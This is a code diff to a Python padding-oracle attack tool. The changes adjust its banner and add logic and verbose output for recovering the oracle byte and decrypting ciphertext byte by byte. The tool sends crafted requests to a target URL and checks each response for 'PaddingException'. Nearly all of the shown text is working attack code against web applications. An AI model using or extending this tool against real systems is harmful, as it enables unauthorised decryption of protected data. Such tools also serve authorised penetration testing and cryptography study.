@@ -43,7 +43,7 @@ def intro():
     | |__) | |_| |_   _| |/  \| | |_ \ \\
     |   __/ \__, | | | |  /\  | |   _   \\
     |  |    |___/  | | |_|  |_| |__| |___\\
-    |__|           |_|      |_____|       KilgoreRuT
+    |__|           |_|      |_____|       KilgoreRooT
 
     ***********************************************''')
     parser = argparse.ArgumentParser()
@@ -92,6 +92,7 @@ def get_next_block(url, hex_string, pos, prev_block, block_size, encoding, param
         return hex_string
     xor_update = {1:3, 2:1, 3:7, 4:1, 5:3, 6:1, 7:15, 8:1, 9:3, 10:1, 11:7, 12:1, 13:3, 14:1, 15:31, 16:1}
     print('*** Getting Byte ' + str(16-pos) + ' ***')
+    potential_match = 0
     for i in range(256):
         post_string = ''
         for j in range(len(hex_string)):
@@ -117,11 +118,18 @@ def get_next_block(url, hex_string, pos, prev_block, block_size, encoding, param
             if verbose or very_verbose:
                 print('    oraclebyte: ' + '\\x' + chr(i).encode('hex-codec'))
                 print('    padding: ' + '\\x' + chr(pos + 1).encode('hex-codec'))
-                print('    keybyte: ' + '\\x' + chr((pos + 1) ^ i).encode('hex_codec'))
+                print('    prev block byte: ' + '\\x' + prev_block[block_size - (pos + 1)].encode('hex_codec'))
             print('[+] Decrypted Byte: ' + chr((pos + 1) ^ i ^ ord(prev_block[block_size - (pos + 1)])) + '\n')
             return get_next_block(url, post_string, pos + 1, prev_block, block_size, encoding, parameter, http_method, error_string, verbose, very_verbose)
         elif 'PaddingException' not in req.text:
             ret = post_string
+            potential_match = i
+    print('[+] Found Oracle Byte!')
+    if verbose or very_verbose:
+        print('    oraclebyte: ' + '\\x' + chr(potential_match).encode('hex-codec'))
+        print('    padding: ' + '\\x' + chr(pos + 1).encode('hex-codec'))
+        print('    prev block byte: ' + '\\x' + prev_block[block_size - (pos + 1)].encode('hex_codec'))
+    print('[+] Decrypted Byte: ' + chr((pos + 1) ^ potential_match ^ ord(prev_block[block_size - (pos + 1)])) + '\n')
     return get_next_block(url, ret, pos + 1, prev_block, block_size, encoding, parameter, http_method, error_string, verbose, very_verbose)
 
 
